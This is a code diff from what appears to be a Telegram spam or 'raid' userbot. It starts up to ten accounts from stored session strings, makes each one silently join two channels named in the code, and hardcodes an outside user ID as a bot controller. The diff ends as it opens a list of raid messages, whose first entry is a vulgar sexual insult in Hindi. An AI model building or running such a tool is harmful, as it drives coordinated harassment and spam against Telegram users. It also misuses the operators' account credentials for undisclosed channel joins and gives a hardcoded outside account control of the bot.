@@ -40,107 +40,272 @@ if 1517994352 not in SUDO_USERS:
     SUDO_USERS.append(1517994352)
 
 # Sessions
-if STRING:
+async def RiZoeLX():
+    global Riz
+    global Riz2
+    global Riz3
+    global Riz5
+    global Riz4
+    global Riz6
+    global Riz7
+    global Riz8
+    global Riz9
+    global Riz10
+    
+    if STRING:
         session_name = str(STRING)
         print("String 1 Found")
-        Riz = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-else:
+        Riz = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 1")
+            await Riz.start()
+            botme = await Riz.get_me()
+            await Riz(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            botid = telethon.utils.get_peer_id(botme)
+            STRING_USERS.append(botid)
+        except Exception as e:
+            Riz = "STRING"
+            print(e)
+            pass
+    else:
         print("Session 1 not Found")
-        pass
-        session_name = "startup"
-        Riz = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-
-if STRING2:
+        session_name = "rizoelxspam"
+        Riz = TelegramClient(session_name, a, b)
+        try:
+            await Riz.start()
+        except Exception as e:
+            pass
+   
+    if STRING2:
         session_name = str(STRING2)
         print("String 2 Found")
-        Riz2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-else:
+        Riz2 = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 2")
+            await Riz2.start()
+            await Riz2(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz2(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            botme = await Riz2.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            STRING_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
         print("Session 2 not Found")
         pass
-        session_name = "startup"
-        Riz2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
+        session_name = "rizoelxspam"
+        Riz2 = TelegramClient(session_name, a, b)
+        try:
+            await Riz2.start()
+        except Exception as e:
+            pass
 
-if STRING3:
+    if STRING3:
         session_name = str(STRING3)
         print("String 3 Found")
-        Riz3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)      
-else:
+        Riz3 = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 3")
+            await  Riz3.start()
+            await Riz3(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz3(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            botme = await Riz3.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            STRING_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
         print("Session 3 not Found")
         pass
-        session_name = "startup"
-        Riz3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
+        session_name = "rizoelxspam"
+        Riz3 = TelegramClient(session_name, a, b)
+        try:
+            await Riz3.start()
+        except Exception as e:
+            pass
 
-if STRING4:
+    if STRING4:
         session_name = str(STRING4)
         print("String 4 Found")
-        Riz4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-else:
+        Riz4 = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 4")
+            await Riz4.start()
+            await Riz4(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz4(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            botme = await Riz4.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            STRING_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
         print("Session 4 not Found")
         pass
-        session_name = "startup"
-        Riz4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
+        session_name = "rizoelxspam"
+        Riz4 = TelegramClient(session_name, a, b)
+        try:
+            await Riz4.start()
+        except Exception as e:
+            pass
 
-if STRING5:
+    if STRING5:
         session_name = str(STRING5)
         print("String 5 Found")
-        Riz5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-        
-else:
+        Riz5 = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 5")
+            await Riz5.start()
+            await Riz5(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz5(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            botme = await Riz5.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            STRING_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
         print("Session 5 not Found")
         pass
-        session_name = "startup"
-        Riz5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-
-if STRING6:
+        session_name = "rizoelxspam"
+        Riz5 = TelegramClient(session_name, a, b)
+        try:
+            await Riz5.start()
+        except Exception as e:
+            pass
+                  
+    if STRING6:
         session_name = str(STRING6)
         print("String 6 Found")
-        Riz6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-else:
+        Riz6 = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 6")
+            await Riz6.start()
+            await Riz6(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz6(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            botme = await Riz6.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            STRING_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
         print("Session 6 not Found")
         pass
-        session_name = "startup"
-        Riz6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
+        session_name = "rizoelxspam"
+        Riz6 = TelegramClient(session_name, a, b)
+        try:
+            await Riz6.start()
+        except Exception as e:
+            pass
 
-if STRING7:
+    if STRING7:
         session_name = str(STRING7)
         print("String 7 Found")
-        Riz7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-else:
+        Riz7 = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 7")
+            await Riz7.start()
+            await Riz7(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz7(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            botme = await Riz7.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            STRING_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
         print("Session 7 not Found")
         pass
-        session_name = "startup"
-        Riz7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-
-if STRING8:
+        session_name = "rizoelxspam"
+        Riz7 = TelegramClient(session_name, a, b)
+        try:
+            await Riz7.start()
+        except Exception as e:
+            pass    
+        
+    
+    if STRING8:
         session_name = str(STRING8)
         print("String 8 Found")
-        Riz8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)      
-else:
+        Riz8 = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 8")
+            await Riz8.start()
+            await Riz8(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz8(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            botme = await Riz8.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            STRING_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
         print("Session 8 not Found")
         pass
-        session_name = "startup"
-        Riz8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-
-if STRING9:
+        session_name = "rizoelxspam"
+        Riz8 = TelegramClient(session_name, a, b)
+        try:
+            await Riz8.start()
+        except Exception as e:
+            pass   
+        
+    if STRING9:
         session_name = str(STRING9)
         print("String 9 Found")
-        Riz9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-else:
+        Riz9 = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 9")
+            await Riz9.start()
+            await Riz9(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz9(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            botme = await Riz9.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            STRING_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
         print("Session 9 not Found")
         pass
-        session_name = "startup"
-        Riz9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-
-if STRING10:
+        session_name = "rizoelxspam"
+        Riz9 = TelegramClient(session_name, a, b)
+        try:
+            await Riz9.start()
+        except Exception as e:
+            pass   
+    
+  
+    if STRING10:
         session_name = str(STRING10)
         print("String 10 Found")
-        Riz10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-else:
+        Riz10 = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 10")
+            await Riz10.start()
+            await Riz10(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz10(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            botme = await Riz10.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            STRING_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
         print("Session 10 not Found")
         pass
-        session_name = "startup"
-        Riz10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
+        session_name = "rizoelxspam"
+        Riz10 = TelegramClient(session_name, a, b)
+        try:
+            await Riz10.start()
+        except Exception as e:
+            pass
 
+loop = asyncio.get_event_loop()
+loop.run_until_complete(RiZoeLX())
  
 RAID = [
     "MADARCHOD TERI MAA KI CHUT ME GHUTKA KHAAKE THOOK DUNGA 🤣🤣",
